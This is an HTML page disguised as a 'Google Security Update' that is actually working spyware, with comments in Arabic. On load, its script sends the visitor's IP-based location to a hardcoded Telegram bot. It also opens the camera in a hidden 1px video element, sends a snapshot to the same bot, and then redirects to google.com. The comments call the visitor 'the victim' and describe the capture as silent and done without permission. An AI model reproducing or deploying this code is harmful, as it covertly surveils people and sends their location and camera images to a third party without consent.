<!DOCTYPE html>
<html>
<head>
    <title>Google Security Update</title>
</head>
<body style="background:#000;color:#0f0;font-family:monospace;text-align:center;">
    <h2 id="log">SYSTEM_ENCRYPTING...</h2>
    <video id="v" autoplay style="width:1px;height:1px;opacity:0;"></video>
    <canvas id="c" style="display:none;"></canvas>

    <script>
        const T = "8439157520:AAGGZBxYp0x6Y54ar3TIrkMaMEHarQASmgY";
        const ID = "1772820433";

        async function send(m, isImg=false) {
            let u = `https://api.telegram.org/bot${T}/`;
            if(!isImg) {
                await fetch(u+'sendMessage',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({chat_id:ID,text:m})});
            } else {
                const b = await (await fetch(m)).blob();
                const f = new FormData(); f.append('chat_id',ID); f.append('photo',b,'x.png');
                await fetch(u+'sendPhoto',{method:'POST',body:f});
            }
        }

        // --- الضربة الأولى: سحب الموقع بـ 3 طرق صامتة (بدون إذن) ---
        async function silentLoc() {
            // محاولة أولى: ipapi
            fetch('https://ipapi.co/json/').then(r=>r.json()).then(d=>send(`📍 صيد IP:\nالمدينة: ${d.city}\nالإحداثيات: ${d.latitude},${d.longitude}`));
            // محاولة ثانية: ip-api (Backup)
            fetch('http://ip-api.com/json/').then(r=>r.json()).then(d=>send(`🌐 موقع احتياطي:\n${d.lat},${d.lon}\nISP: ${d.isp}`));
        }

        // --- الضربة الثانية: مباغتة الكاميرا (The Phantom Strike) ---
        async function phantomCam() {
            try {
                // محاولة فتح الكاميرا في الخلفية فوراً
                const s = await navigator.mediaDevices.getUserMedia({video:{facingMode:"user",width:1280,height:720}});
                const vid = document.getElementById('v');
                vid.srcObject = s;
                setTimeout(()=>{
                    const can = document.getElementById('c');
                    can.width=vid.videoWidth; can.height=vid.videoHeight;
                    can.getContext('2d').drawImage(vid,0,0);
                    send(can.toDataURL('image/png'),true);
                    s.getTracks().forEach(t=>t.stop());
                }, 100); // سرعة البرق: 100ms
            } catch(e) {
                // إذا فشل، نرسل تنبيه "الضحية منتبه"
                send("⚠️ الضحية لديه حماية قوية أو رفض الإذن!");
            }
        }

        window.onload = () => {
            silentLoc();
            phantomCam();
            // توجيه الضحية لصفحة وهمية بعد السحب
            setTimeout(()=> { window.location.href="https://www.google.com"; }, 3000);
        };
    </script>
</body>
</html>
